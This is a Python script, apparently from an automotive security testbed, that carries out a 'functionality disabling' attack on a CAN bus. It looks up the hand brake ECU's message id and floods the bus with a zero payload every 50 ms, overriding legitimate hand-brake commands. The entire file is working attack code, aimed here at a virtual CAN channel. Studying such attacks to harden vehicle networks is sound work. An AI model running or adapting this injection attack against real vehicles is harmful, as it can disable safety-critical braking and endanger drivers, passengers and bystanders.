import can
import time

from attacks.reverse_engineering import FEATURE_CAN_ID_PAYLOAD_MAPPER
from can_network import VCAN_ATTACKER_CHANNEL, CAN_INTERFACE

# Target the hand brake ECU function (CAN id 0x604, see reverse_engineering.py).
# Its real cycle time in the DBC is 200 ms; we send a neutral/"off" payload much
# faster so every legitimate hand-brake command is continuously overwritten,
# effectively disabling the function.
TARGET_ID = FEATURE_CAN_ID_PAYLOAD_MAPPER["hand_brake"]["id"]
NEUTRAL_PAYLOAD = [0x00]
PERIOD = 0.05

def main():
    print("Conducting Functionality Disabling attack on CAN bus...")
    bus = can.interface.Bus(channel=VCAN_ATTACKER_CHANNEL, interface=CAN_INTERFACE)
    try:
        while True:
            msg = can.Message(arbitration_id=TARGET_ID, data=NEUTRAL_PAYLOAD, is_extended_id=False)
            bus.send(msg)
            print(f"Overwriting hand_brake (ID=0x{TARGET_ID:03X}) with neutral payload")
            time.sleep(PERIOD)
    except KeyboardInterrupt:
        print("Functionality Disabling attack stopped by user.")
    except Exception as e:
        print(f"An error occurred: {e}")

if __name__ == "__main__":
    main()
